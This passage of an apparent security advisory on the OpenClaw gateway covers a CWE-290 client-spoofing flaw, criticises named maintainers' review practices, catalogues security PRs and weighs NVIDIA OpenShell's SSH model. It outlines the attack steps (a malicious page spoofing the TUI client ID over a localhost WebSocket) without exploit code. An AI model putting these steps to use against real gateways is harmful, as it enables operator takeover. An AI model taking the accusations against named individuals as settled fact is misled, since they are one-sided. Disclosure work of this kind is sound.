5. **The `maintainer` label bypasses all gates.** External contributors face "meaningful PRs only" scrutiny. Internal maintainers face none.

### B.4 The "Circle" — Who Has Merge Access

Based on public org membership, the `openclaw` GitHub organization has **19 public members**:

```
alauppe, altaywtf, Asleep123, BunsDev, cpojer, darkamenosa, Evizero,
grp06, gumadeiras, huntharo, hydro13, mukhtharcm, sebslight,
shakkernerd, thewilloftheshadow, tyler6204, velvet-shark, vincentkoc, zimeg
```

Several PR authors (`mbelinky`, `frankekn`, `obviyus`, `eleqtrizit`) are **not public org members** but still have the `maintainer` label and merge access. This suggests either:

- They are private/org-hidden members with elevated access
- The `maintainer` label is applied broadly to a "circle" beyond the formal org roster
- Steinberger grants merge access outside the org membership system

`eleqtrizit` lists their employer as **NVIDIA**. `frankekn` lists their employer as **Omnidrome**. These are not OpenClaw employees — they are external contributors with internal privileges.

### B.5 What This Means

The security vulnerability pattern documented in this advisory is not the work of one careless individual. It is the predictable outcome of a **governance structure**:

- **Peter Steinberger** sets the tone: security PRs from outsiders are closed, proxy support is dismissed, cosmetic refactors are prioritized over HIGH severity fixes.
- **Maintainers** operate with no review friction: self-merge, no CODEOWNERS enforcement, no security bot response requirement.
- **The `maintainer` label** functions as a review bypass, exempting insiders from the quality gates imposed on everyone else.
- **Security tooling is decorative** — it generates findings that no process requires anyone to read or act on.

The result: **22 bot-flagged security findings merged without remediation, 9 of them HIGH severity, across 11 PRs, with zero human responses.** This is not a series of innocent mistakes. It is a systemic governance failure.

---

## Appendix D: Open and Closed PRs — Proxy Support and Security Hardening Attempts

This appendix catalogs the current state of community attempts to address proxy support and gateway security in `openclaw/openclaw`. The picture is clear: security PRs from external contributors languish or get closed, while the vulnerabilities they would fix accumulate.

### D.1 Open PRs Attempting to Address Security/Proxy Issues

None of these address the CWE-290 TUI spoofing vulnerability. **No open PR proposes a fix for `isOperatorUiClient()` or `isControlUi`.**

| PR                                                        | Title                                                                                 | Author            | Created    | Status  | What It Tries to Fix                                                                                                                                                                                                                                         |
| --------------------------------------------------------- | ------------------------------------------------------------------------------------- | ----------------- | ---------- | ------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [#63379](https://github.com/openclaw/openclaw/pull/63379) | `Feature/trusted proxy loopback`                                                      | `mrosmarin`       | 2026-04-08 | 🟡 Open | Trusted-proxy mode rejects loopback connections even from `trustedProxies`. Adds `trustedProxy.allowLoopback` config. Touches `gateway/auth.ts`, `message-handler.ts`. Most directly relevant reverse proxy PR.                                              |
| [#63017](https://github.com/openclaw/openclaw/pull/63017) | `fix(security): apply security patches for multiple GHSA vulnerabilities`             | `EthanHunter1229` | 2026-04-08 | 🟡 Open | Cherry-picks fixes for GHSA-fqw4-mph7-2vr8 (Critical: silent privilege escalation via shared-auth reconnect) and GHSA-9hjh-fr4f-gxc4 (Critical: non-admin operator scopes self-claim admin). Not proxy-related, but addresses critical auth vulnerabilities. |
| [#63280](https://github.com/openclaw/openclaw/pull/63280) | `fix(browser): auto-generate browser control auth token for none/trusted-proxy modes` | `pgondhi987`      | 2026-04-08 | 🟡 Open | Browser control HTTP server runs with zero authentication when `auth.mode=none` or `trusted-proxy`. 45+ browser automation routes open to any process on loopback. Auto-generates a random 48-hex-char token.                                                |
| [#62973](https://github.com/openclaw/openclaw/pull/62973) | `security: prompt injection defense at message and tool result boundaries`            | `sarkarsaurabh27` | 2026-04-08 | 🟡 Open | Adds structural trust delimiters (`<user_message owner="false">`) so the model treats externally-sourced content as data, not instructions. References OWASP LLM01, EchoLeak CVE-2025-32711.                                                                 |
| [#32373](https://github.com/openclaw/openclaw/pull/32373) | `Add token hardening modules for gateway (T-ACCESS-003)`                              | `Techris93`       | 2026-03-03 | 🟡 Open | Token redaction in logs, auth token exposure reduction. Open for **36+ days** with no merge.                                                                                                                                                                 |
| [#50180](https://github.com/openclaw/openclaw/pull/50180) | `fix(ssrf): honor empty URL allowlists as deny-all`                                   | `dims`            | 2026-03-19 | 🟡 Open | SSRF protection: empty URL allowlists should be treated as deny-all, not allow-all. Open for **20+ days**.                                                                                                                                                   |
| [#50181](https://github.com/openclaw/openclaw/pull/50181) | `fix: close media trust bypasses`                                                     | `dims`            | 2026-03-19 | 🟡 Open | Media trust bypass — accepting untrusted remote media URLs. Open for **20+ days**.                                                                                                                                                                           |
| [#58034](https://github.com/openclaw/openclaw/pull/58034) | `fix(net): skip DNS pinning when routing through trusted env proxy`                   | `cosmicnet`       | 2026-03-31 | 🟡 Open | Network-layer proxy routing — DNS pinning skips when routing through trusted environment proxy.                                                                                                                                                              |

### D.2 Closed Without Merge — Rejected Proxy/Security PRs

These PRs attempted to improve security or proxy support and were closed without merging.

| PR                                                        | Title                                                                              | Author       | Opened     | Closed     | Days Open      | Why Closed                                                                                                                                                                        |
| --------------------------------------------------------- | ---------------------------------------------------------------------------------- | ------------ | ---------- | ---------- | -------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [#29271](https://github.com/openclaw/openclaw/pull/29271) | `fix: Telegram gateway reads HTTP_PROXY/HTTPS_PROXY env vars for proxy`            | `gotnull`    | 2026-02-28 | 2026-04-08 | **40 days**    | Stale-bot auto-close. "Closing due to inactivity. Post in #pr-thunderdome-dangerzone on Discord to talk to a maintainer." No maintainer ever reviewed it.                         |
| [#59156](https://github.com/openclaw/openclaw/pull/59156) | `fix(exec): prevent symlink and hardlink path traversal in script preflight reads` | `pgondhi987` | 2026-04-01 | 2026-04-03 | 2 days         | Barnacle bot: "Closing this PR because it looks dirty (too many unrelated or unexpected changes)." A security fix for path traversal was rejected because the branch was "dirty." |
| [#61914](https://github.com/openclaw/openclaw/pull/61914) | `fix(gateway): resolve catastrophic backtracking in interpreter heuristics regex`  | `openperf`   | 2026-04-06 | 2026-04-06 | **< 1 minute** | Opened and closed the same minute. No explanation.                                                                                                                                |
| [#62150](https://github.com/openclaw/openclaw/pull/62150) | `fix: the nostr plugin exposes gateway authenticated headers`                      | `drobison00` | 2026-04-06 | 2026-04-08 | 2 days         | No visible explanation.                                                                                                                                                           |
| [#62151](https://github.com/openclaw/openclaw/pull/62151) | `fix: openclaw accepts remote media urls from normal q`                            | `drobison00` | 2026-04-06 | 2026-04-08 | 2 days         | No visible explanation.                                                                                                                                                           |
| [#1](https://github.com/openclaw/openclaw/pull/1)         | `fix: add @lid format support and allowFrom wildcard handling`                     | `mneves75`   | 2025-11-26 | 2025-11-26 | **< 1 day**    | Closed same day. Origin/allowFrom proxy-relevant fix.                                                                                                                             |

### D.3 The `markfietje/openclaw` Fork PR

**No PR from `markfietje` was found in the `openclaw/openclaw` repository.** The fork (`markfietje/openclaw`) exists at `https://github.com/markfietje/openclaw` with the comprehensive security hardening described in this advisory (commit `20d1702a3f`). If a PR was submitted, it has been deleted or was submitted via a different mechanism. The user reports it was closed by maintainers.

### D.4 Notable: The One Proxy PR That DID Get Merged

| PR                                                        | Title                                                                 | Author   | Created          | Merged           | Turnaround         |
| --------------------------------------------------------- | --------------------------------------------------------------------- | -------- | ---------------- | ---------------- | ------------------ |
| [#62878](https://github.com/openclaw/openclaw/pull/62878) | `fix(slack): honor HTTPS_PROXY for Socket Mode WebSocket connections` | `mjamiv` | 2026-04-08 03:24 | 2026-04-08 04:38 | **~1 hour 14 min** |

This is notable because **`@MJAMIV`** is the same user who publicly tweeted at Peter Steinberger:

> _"Ship a stable WebSocket layer. Four months of proxy workarounds for something that should just honor HTTPS_PROXY out of the box."_

Steinberger's response: _"Got a PR? I don't use proxy but happy to review."_

`@MJAMIV` then submitted a PR. It was merged in ~1 hour. But it only fixes proxy support for **Slack Socket Mode** — a single channel's WebSocket connection. It does nothing for the gateway's own WebSocket endpoint, the origin check system, the reverse proxy header handling, or any of the security hardening the fork provides.

### D.5 Timeline Summary

| Date             | Event                                                                                                                        |
| ---------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| 2025-11-26       | PR #1 (`allowFrom wildcard handling`) opened and closed same day                                                             |
| 2026-02-28       | PR #29271 (`Telegram HTTP_PROXY/HTTPS_PROXY`) opened by `gotnull`                                                            |
| 2026-03-03       | PR #32373 (`token hardening modules`) opened by `Techris93` — **still open 36+ days later**                                  |
| 2026-03-19       | PR #50180 (`SSRF URL allowlist deny-all`) and #50181 (`media trust bypass`) opened by `dims` — **still open 20+ days later** |
| 2026-03-27       | PR #55730 (`TUI onboarding`) merged by `shakkernerd` — introduces CWE-290 (this advisory)                                    |
| 2026-03-31       | PR #58034 (`DNS pinning for trusted env proxy`) opened — **still open**                                                      |
| 2026-04-01       | PR #59156 (`symlink path traversal fix`) opened by `pgondhi987`, closed 2 days later — "branch looks dirty"                  |
| 2026-04-06       | PR #61914 (`catastrophic regex backtracking`) opened and closed same minute                                                  |
| 2026-04-08 03:24 | PR #62878 (`Slack HTTPS_PROXY`) opened by `mjamiv`                                                                           |
| 2026-04-08 04:17 | PR #29271 (`Telegram HTTPS_PROXY`) auto-closed by stale-bot after **40 days** with no human review                           |
| 2026-04-08 04:38 | PR #62878 (`Slack HTTPS_PROXY`) **merged** — ~1 hour turnaround                                                              |
| 2026-04-08 08:10 | PR #63017 (`multi-GHSA security patches`) opened — **still open**                                                            |
| 2026-04-08 17:40 | PR #63280 (`browser control auth token`) opened — **still open**                                                             |
| 2026-04-08 21:33 | PR #63379 (`trusted proxy loopback`) opened — **still open**, most relevant reverse proxy PR                                 |
| —                | **No PR exists** to fix the CWE-290 TUI spoofing vulnerability documented in this advisory                                   |

### D.6 What This Shows

1. **Proxy support PRs are stalemated.** The Telegram proxy PR (#29271) sat for 40 days with no human review before being auto-closed by stale-bot. The one proxy PR that merged (#62878 — Slack) is a narrow channel-specific fix, not gateway-wide proxy support.

2. **Security PRs from external contributors are ignored or rejected.** Path traversal fix (#59156) rejected for "dirty branch." Regex DoS fix (#61914) closed in under a minute. Nostr auth exposure (#62150) closed without explanation. Token hardening (#32373) still open after 36+ days.

3. **No one is working on the CWE-290 fix.** As of 2026-04-08, there is no open PR, no open issue, and no commit addressing the TUI client spoofing vulnerability in `message-handler.ts`. The vulnerability has been publicly documented by three automated security tools for 12 days with zero maintainer response.

4. **The fork remains the only comprehensive fix.** `markfietje/openclaw` (commit `20d1702a3f`) addresses CWE-290, reverse proxy origin awareness, endpoint isolation, rate limiting, message authorization, timing-safe nonce comparison, and 9 security files that don't exist in upstream. Its PR was closed.

---

## Appendix E: The NVIDIA OpenShell Connection — Why SSH/VPN Does Not Fix CWE-290

A question worth asking: _does the deployment model behind OpenClaw make reverse proxy support unnecessary?_ The answer is no — and the timing raises questions worth examining.

### E.1 What Is OpenShell?

OpenShell is a managed sandbox backend bundled with OpenClaw. It delegates sandbox lifecycle to the `openshell` CLI, which provisions remote environments with SSH-based command execution:

```
docs/gateway/openshell.md:
"OpenShell is a managed sandbox backend for OpenClaw. Instead of running Docker
containers locally, OpenClaw delegates sandbox lifecycle to the `openshell` CLI,
which provisions remote environments with SSH-based command execution."
```

The OpenShell plugin (`extensions/openshell/`) supports two workspace modes:

- **`mirror`**: Local workspace stays canonical, synced to remote sandbox
- **`remote`**: Remote workspace is canonical, accessed via SSH

Transport is SSH. No reverse proxy is involved. OpenShell's gateway endpoint configuration (`gatewayEndpoint`) points to the OpenClaw gateway, but sandbox command execution goes through SSH, not through the gateway's WebSocket.

### E.2 The NVIDIA Connection

The Slack HTTPS_PROXY PR (#62878) contains the most direct evidence of NVIDIA's involvement:

```
PR #62878 body:
"This breaks Socket Mode in proxy-only environments (sandboxed containers,
corporate networks, NVIDIA OpenShell)."

"Production validation: we've been running an equivalent monkey-patch
(openclaw-ws-proxy-patch.js) across 4 OpenClaw agents on NVIDIA OpenShell
sandboxes since March 2026, routing all Slack Socket Mode traffic through
an HTTP CONNECT proxy at 10.200.0.1:3128."
```

Additional connections:

- **`eleqtrizit`** (bio: "AI Idea Man at NVIDIA") is a maintainer with the `maintainer` label and merge access, contributing to gateway security code
- OpenClaw's provider list includes first-class **NVIDIA NIM** support (`nvidia-nim` provider, Nemotron models)
- OpenShell's architecture assumes SSH/VPN connectivity, not reverse proxy exposure

### E.3 Timeline: OpenShell Emergence vs CWE-290 Introduction

| Date           | Event                                                                                                |
| -------------- | ---------------------------------------------------------------------------------------------------- |
| **2026-03-19** | OpenShell extension first appears in the repository (`5508374669`)                                   |
| **2026-03-27** | PR #55730 merged — CWE-290 TUI spoofing vulnerability introduced                                     |
| **2026-04-08** | PR #62878 merged — Slack proxy fix, explicitly references "NVIDIA OpenShell sandboxes" in production |

OpenShell emerged in the codebase **8 days before** the CWE-290 vulnerability was introduced. The Slack proxy PR confirms NVIDIA is running "4 OpenClaw agents on NVIDIA OpenShell sandboxes" in production since March 2026.

### E.4 The "SSH/VPN Replaces Reverse Proxy" Argument

The argument appears to be:

> _OpenShell uses SSH for sandbox transport. VPN provides network connectivity. Reverse proxies are unnecessary. Therefore reverse proxy support — and the security hardening that comes with it — is not needed._

This argument is wrong for three reasons:

**Reason 1: The vulnerability is not about proxy transport. It is about client identity spoofing.**

CWE-290 exploits how the gateway authenticates WebSocket clients. The attack vector is:

1. A malicious website opens `ws://localhost:18789` from the victim's browser
2. The spoofed `"openclaw-tui"` client ID bypasses origin checks and auth gates
3. The attacker gets operator access

This attack has **nothing to do with proxy transport**. It works whether the gateway is behind a reverse proxy, a VPN, SSH tunnel, or directly on localhost. The browser is the attack vector, not the network topology.

**Reason 2: SSH/VPN does not protect the gateway's WebSocket endpoint.**

OpenShell uses SSH for sandbox command execution. But the OpenClaw gateway's primary interface is its **WebSocket endpoint** — that's how the TUI, Control UI, webchat, CLI, and all connected clients communicate. SSH transport for sandbox commands is orthogonal to WebSocket security.

A VPN connects the user to the network. But the browser CSRF attack (Section 9.2) happens locally — the malicious website's JavaScript connects to `ws://localhost:18789` through the browser. The VPN does not prevent this. The SSH tunnel does not prevent this.

**Reason 3: OpenShell sandboxes may expose the gateway endpoint.**

OpenShell's configuration includes a `gatewayEndpoint` parameter:

```ts
// extensions/openshell/src/config.ts
gatewayEndpoint?: string;  // Points to the OpenClaw gateway
```

If an OpenShell sandbox can reach the gateway's WebSocket endpoint — which it must, since agent tool execution routes through the gateway — then the CWE-290 vulnerability is exploitable from within the sandbox environment. An OpenShell sandbox that runs untrusted code could execute the same WebSocket spoofing attack against the gateway.

### E.5 The Real Question

The question is not whether SSH is more secure than HTTP reverse proxies (it is, for sandbox transport). The question is whether the OpenClaw gateway's **WebSocket authentication layer** is secure regardless of transport. It is not:

| Defense                   | Protects Against                       | Does NOT Protect Against                 |
| ------------------------- | -------------------------------------- | ---------------------------------------- |
| SSH sandbox transport     | Sandbox command interception           | WebSocket client spoofing (CWE-290)      |
| VPN tunnel                | Network-level MITM                     | Browser CSRF to localhost WebSocket      |
| No reverse proxy          | Direct internet exposure to proxy bugs | Client identity spoofing via `client.id` |
| `allowInsecureAuth: true` | — (removes a security gate)            | — (makes the bypass easier)              |

Steinberger's position — "I don't use proxy" — may reflect the NVIDIA OpenShell deployment model where SSH/VPN replaces reverse proxies for sandbox connectivity. But this conflates **sandbox transport** with **gateway authentication**. The CWE-290 vulnerability is in the gateway's authentication layer, not in its network transport. SSH/VPN is the right tool for sandbox access. It does not fix a broken authentication gate in the WebSocket handshake.

### E.6 The Bottom Line

OpenShell's SSH-based sandbox model is a reasonable architectural choice. It does not require reverse proxy support for sandbox connectivity. But the absence of reverse proxy support does not justify:

1. **Ignoring the CWE-290 vulnerability** — which exploits client identity spoofing, not proxy transport
2. **Dismissing reverse proxy security hardening** — which protects users who deploy behind Caddy/Nginx (Docker, VPS, Tailscale, home servers)
3. **Closing security PRs** — that address gateway authentication vulnerabilities unrelated to transport
4. **Shipping with zero origin-check proxy tests** (upstream has 0; the fork has 28) — when users behind reverse proxies have no security coverage

The NVIDIA OpenShell deployment model may not need reverse proxy support. But OpenClaw is an open-source project with 350,000+ stars and 70,000+ forks. Its users deploy in every configuration imaginable — including reverse proxies. Dismissing gateway security because one deployment model uses SSH is a category error.

The vulnerability affects:

- ✅ MacBook localhost + TUI (Steinberger's setup) — exploitable via browser CSRF
- ✅ Docker with default `bind=lan` — exploitable from LAN/internet
- ✅ VPS/cloud behind Caddy/Nginx — exploitable from internet
- ✅ Tailscale networks — exploitable from any tailnet device
- ✅ OpenShell sandboxes — exploitable if sandbox can reach the gateway WebSocket
- ❌ Not affected by SSH sandbox transport or VPN connectivity — those are orthogonal
